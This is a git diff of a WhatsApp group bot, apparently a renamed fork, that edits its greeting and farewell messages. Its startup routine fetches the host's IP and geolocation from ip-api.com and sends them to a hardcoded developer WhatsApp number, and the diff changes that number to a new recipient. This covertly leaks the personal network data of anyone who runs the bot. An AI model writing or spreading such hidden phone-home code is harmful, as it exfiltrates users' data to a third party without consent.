@@ -1,4 +1,4 @@
-// BASE
+ // BASE
 const
 	{
     WAConnection: _WAConnection,
@@ -56,7 +56,7 @@ const starts = async (hyper = new WAConnection()) => {
     console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       hyper.sendMessage("94767043432@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/94767043432?text=welcome"}}})
+       hyper.sendMessage("919072702448@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Richuser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/king.jpg'),sourceUrl:"https://wa.me/919072702448?text=Hlo,Richuser_iam_your_big_fan"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
     hyper.on('connecting', () => {
@@ -129,8 +129,8 @@ const imageToBase64 = require('image-to-base64')
        
 
         buttons = [
-          { buttonId: `h`, buttonText: { displayText: "nice to meet you" }, type: 1 },
-                    { buttonId: `t`, buttonText: { displayText: "which person are you" }, type: 1 },
+          { buttonId: `h`, buttonText: { displayText: "nthina ee grpl vanne" }, type: 1 },
+                    { buttonId: `t`, buttonText: { displayText: "ninne njn welcome cheyyunnu nanba" }, type: 1 },
                      { buttonId: `g`, buttonText: { displayText: "girl/boy" }, type: 1 },
         ];         
         imageMsg = (
@@ -140,7 +140,7 @@ const imageToBase64 = require('image-to-base64')
         ).imageMessage;
         buttonsMessage = {
           contentText: `${teks}`,
-          footerText: "welcome sis",
+          footerText: "welcome by acebot",
           imageMessage: imageMsg,
           buttons: buttons,
           headerType: 4,
@@ -160,11 +160,11 @@ const imageToBase64 = require('image-to-base64')
         anu_user = w.vname || w.notify || num.split("@")[0];
         time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
         memeg = mdata.participants.length;
-        out = `Why is that? how come out? \nGood bye ${anu_user} we will miss you`;
+        out = `nthina left aaye mwonu? ini ni ee grpl keriyal ninne njn bithiyil ottikkum \nGood bye ${anu_user} one sec silent🤐 for him`;
 
                buff = await getBuffer(`https://fdz-app.herokuapp.com/api/maker/goodbye?name=${anu_user}&picurl=${imge}&namegrp=${encodeURI(mdata.subject)}&imggrp=${ime}&member=@${anu_user}&picbg=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTk_nUY-WcxLBvTRJPNBUKhqWA6LdZCmZG75A&usqp=CAU`);
         buttons = [
-          { buttonId: `y`, buttonText: { displayText: "Good Bye👋" }, type: 1 },
+          { buttonId: `y`, buttonText: { displayText: "Bye Mwonu rip👋" }, type: 1 },
         ];
         imageMsg = (
           await hyper.prepareMessageMedia(buff, "imageMessage", {
